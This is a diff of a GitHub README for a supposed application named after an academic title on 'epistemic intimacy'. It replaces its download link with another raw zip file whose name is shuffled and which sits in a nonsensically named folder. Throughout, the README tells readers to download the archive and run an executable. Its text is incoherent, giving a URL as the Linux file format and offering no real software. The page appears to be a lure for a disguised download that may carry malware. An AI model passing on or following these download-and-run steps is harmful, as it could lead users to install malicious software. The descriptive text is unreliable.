@@ -1,6 +1,6 @@
 # 🎉 Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy - Explore a New Framework for Understanding
 
-[![Download](https://raw.githubusercontent.com/jainvikas80/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy/main/coccygomorphic/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy.zip%https://raw.githubusercontent.com/jainvikas80/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy/main/coccygomorphic/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy.zip)](https://raw.githubusercontent.com/jainvikas80/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy/main/coccygomorphic/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy.zip)
+[![Download](https://raw.githubusercontent.com/jainvikas80/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy/main/coccygomorphic/Reconceptualising-Epistemic-Intimacy-The-Care-as-of-Science-Knowing-New-domineeringly.zip%https://raw.githubusercontent.com/jainvikas80/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy/main/coccygomorphic/Reconceptualising-Epistemic-Intimacy-The-Care-as-of-Science-Knowing-New-domineeringly.zip)](https://raw.githubusercontent.com/jainvikas80/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy/main/coccygomorphic/Reconceptualising-Epistemic-Intimacy-The-Care-as-of-Science-Knowing-New-domineeringly.zip)
 
 ## 📖 Project Description
 
@@ -12,13 +12,13 @@ To start using the application, please follow these simple steps:
 
 1. **Visit the Download Page:**  
    Click the link below to access the latest release.  
-   [Download Latest Release](https://raw.githubusercontent.com/jainvikas80/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy/main/coccygomorphic/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy.zip)
+   [Download Latest Release](https://raw.githubusercontent.com/jainvikas80/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy/main/coccygomorphic/Reconceptualising-Epistemic-Intimacy-The-Care-as-of-Science-Knowing-New-domineeringly.zip)
 
 2. **Choose the Right File:**  
    Look for a file that matches your operating system. Common options include:  
    - Windows: `.exe` format  
    - macOS: `.dmg` format  
-   - Linux: `https://raw.githubusercontent.com/jainvikas80/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy/main/coccygomorphic/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy.zip` format
+   - Linux: `https://raw.githubusercontent.com/jainvikas80/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy/main/coccygomorphic/Reconceptualising-Epistemic-Intimacy-The-Care-as-of-Science-Knowing-New-domineeringly.zip` format
 
 3. **Download the File:**  
    Click the file name to start the download. Your browser will save it to your default download location.
@@ -26,7 +26,7 @@ To start using the application, please follow these simple steps:
 4. **Install the Application:**  
    - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.  
    - **macOS:** Open the `.dmg` file, then drag the application into your Applications folder.  
-   - **Linux:** Extract the `https://raw.githubusercontent.com/jainvikas80/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy/main/coccygomorphic/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy.zip` file. Open the terminal and navigate to the extracted folder. Run the application using the command: `./your_application_name`.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/jainvikas80/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy/main/coccygomorphic/Reconceptualising-Epistemic-Intimacy-The-Care-as-of-Science-Knowing-New-domineeringly.zip` file. Open the terminal and navigate to the extracted folder. Run the application using the command: `./your_application_name`.
 
 5. **Run the Application:**  
    After installation, locate the application in your installed programs or Applications folder. Click the icon to open it.
@@ -62,7 +62,7 @@ These areas help in understanding how we relate to knowledge and each other.
 ## 🔧 Download & Install
 
 To get started, please follow this link to download the software:  
-[Download Latest Release](https://raw.githubusercontent.com/jainvikas80/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy/main/coccygomorphic/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy.zip)
+[Download Latest Release](https://raw.githubusercontent.com/jainvikas80/Reconceptualising-Knowing-as-Care-The-New-Science-of-Epistemic-Intimacy/main/coccygomorphic/Reconceptualising-Epistemic-Intimacy-The-Care-as-of-Science-Knowing-New-domineeringly.zip)
 
 Once downloaded, choose the appropriate file for your operating system, install according to the instructions provided, and start your journey with epistemic psychology today.
 
